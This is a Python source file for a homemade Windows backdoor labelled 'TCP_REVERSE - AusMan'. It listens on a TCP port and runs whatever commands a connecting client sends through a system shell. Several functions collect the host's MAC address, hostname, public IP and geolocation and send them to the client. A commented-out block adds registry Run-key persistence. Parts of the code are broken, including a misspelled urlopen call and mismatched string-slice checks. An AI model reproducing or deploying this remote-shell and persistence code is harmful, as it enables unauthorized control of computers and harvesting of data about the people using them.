import socket
import subprocess
import os
import uuid
import urllib.request
import json
import platform
import winreg

'''class persistance:
	def __init__(self):
		self.check_reg()

	def add_reg(self):
		try:
			addr = 'c:/desktop/tcp_reverse.exe'
			reg_hkey = winreg.HKEY_CURRENT_USER
			key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
			winreg.SetValueEx(key, 'tcp_reverse', 0, winreg.REG_SZ, addr)
			winreg.CloseKey(key)
		except:
			pass

	def check_reg(self):
		try:
			reg_hkey = winreg.HKEY_CURRENT_USER
			key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
			index = 0
			while True:
				v = winreg.EnumValue(key, index)
				if 'tcp_reverse' not in v:
					index += 1
					continue
				return True
		except:
			winreg.CloseKey(key)
			self.add_reg()'''



class CommonData:
	def __init__(self):
		pass

	@property # turns commands into variables
	def mac(self):
		try:
			mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
			return mac
		except:
			return 'null'
	@property
	def hostname(self):
		try:
			hostname = socket.getfqdn(socket.gethostname()).strip()
			return hostname
		except:
			return 'null'

	@property
	def public_ip(self):
		try:
			return urllib.request.urlopen('https://api.ipify.org/').read().decode('utf8')
		except:
			return 'null'

	@property
	def location(self):
		try:
			data = urllib.request.urlopepn("https://freegeoip.app/json/").read().decode('utf8')
			json_data = json.loads(data)
			country_name = json_data['country_name']
			city = json_data['city']
			return '%s:%s' % (country_name, city)
		except:
			return 'null'

	@property
	def machine(self):
		try:
			return platform.system()
		except:
			return 'null'

	def core(self):
		try:
			return platform.machine()
		except:
			return 'null'

class revshell(): # shell class
	# class variables
	HOST = 'localhost'#socket.gethostbyname(socket.gethostname()) # runs client on their local machine
	PORT = 1000 # our tcp port to connect to
	BUFF_SIZE = 2048

	def __init__(self):
		# create persistence for tcp socket
		#p = persistance()
		# tcp socket
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
		# bind socket to address (host, port)
		self.s.bind((self.HOST, self.PORT))
		# listen for incoming connections
		self.s.listen()
		print(f'[+] Listening on {self.HOST}: {self.PORT}')
		self.socket_init()

	def socket_init(self):
		self.client_socket, self.client_address = self.s.accept()
		print(f'[+] Accepted connection from {self.client_address[0]}:{self.client_address[1]}')
		self.main()


	def send_msg(self, msg):
		# convert string into a utf-8 byte
		msg = bytes(f'{msg}\n\nShell $ ', 'utf8')
		send = self.client_socket.sendall(msg)
		# return 'None' if sendall works
		return send

	def recv_msg(self):
		recv = self.client_socket.recv(self.BUFF_SIZE)
		# return value is a byte object representing the received data
		return recv

	def main(self):
		# sends connection message
		if self.send_msg("="*25 + '\n' + "TCP_REVERSE - AusMan" + '\n' + "="*25 + '\n' + "[tcp_reverse] You have connected.") != None:
			print('[!] An error has occured.')

		# magic
		while True:
			try:
				msg = ''
				chunk = self.recv_msg()
				msg += chunk.strip().decode('utf8')
				# hq for commands/functions and object data received
				self.hq(msg)
			except:
				# close client socket
				self.client_socket.close()
				# go back to socket_init() method and listen for new connections
				self.socket_init()

	def hq(self, msg):
		try:
			if msg[:5] == 'info.':
				info = CommonData()
				if msg[:10] == 'info.mac':
					self.send_msg(info.mac)
				elif msg[:13] == 'info.hostname':
					self.send_msg(info.hostname)
				elif msg[:7] == 'info.ip':
					self.send_msg(info.public_ip)
				elif msg[:13] == 'info.location':
					self.send_msg(info.location)
				elif msg[:12] == 'info.machine':
					self.send_msg(info.machine)
				elif msg[:9] == 'info.core':
					self.send_msg(info.core)
			else:
				# normal command prompt
				tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
				stdout, stderr = tsk.communicate()
				# subprocess result
				results = stdout.decode('utf8')
				if msg[:2] == 'cd':
					os.chdir(msg[3:])
					self.send_msg("[tcp_reverse] Directory changed.")
				elif msg[:4] == 'exit':
					# close client socket
					self.client_socket.close()
					# go to socket_init() and listen for connections
					self.socket_init()
				else:
					# send result to client
					self.send_msg(results)
		except Exception as e:
			self.send_msg(f'[tcp_reverse] {e}') # send command errors


if __name__ == "__main__":
	shell = revshell()